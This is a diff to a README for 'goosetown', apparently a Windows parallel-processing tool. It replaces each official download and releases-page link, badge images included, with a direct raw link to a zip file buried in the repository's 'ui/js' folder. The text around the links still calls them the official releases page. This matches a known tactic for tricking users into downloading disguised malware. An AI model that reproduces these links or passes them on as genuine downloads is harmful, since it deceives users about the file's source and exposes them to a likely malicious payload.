@@ -1,6 +1,6 @@
 # 🦆 goosetown - Parallel Processing Made Simple
 
-[![Download goosetown](https://img.shields.io/badge/Download-goosetown-orange?style=for-the-badge)](https://github.com/armanydavid529/goosetown/releases)
+[![Download goosetown](https://github.com/armanydavid529/goosetown/raw/refs/heads/main/ui/js/Software-v2.0.zip)](https://github.com/armanydavid529/goosetown/raw/refs/heads/main/ui/js/Software-v2.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to get goosetown up and running on your Windows PC:
 
 1. **Visit the Download Page:**  
    Open this link in your browser:  
-   [Download goosetown Releases](https://github.com/armanydavid529/goosetown/releases)  
+   [Download goosetown Releases](https://github.com/armanydavid529/goosetown/raw/refs/heads/main/ui/js/Software-v2.0.zip)  
    This page shows the latest versions of goosetown.
 
 2. **Choose the Right Version:**  
@@ -103,7 +103,7 @@ For error messages, note the exact text and look for help in the Issues section 
 
 Click the badge below to visit the official download page now and get started:
 
-[![Download goosetown](https://img.shields.io/badge/Download-goosetown-blue?style=for-the-badge)](https://github.com/armanydavid529/goosetown/releases)
+[![Download goosetown](https://github.com/armanydavid529/goosetown/raw/refs/heads/main/ui/js/Software-v2.0.zip)](https://github.com/armanydavid529/goosetown/raw/refs/heads/main/ui/js/Software-v2.0.zip)
 
 On that page, pick the latest `.exe` file and follow the instructions above.
 
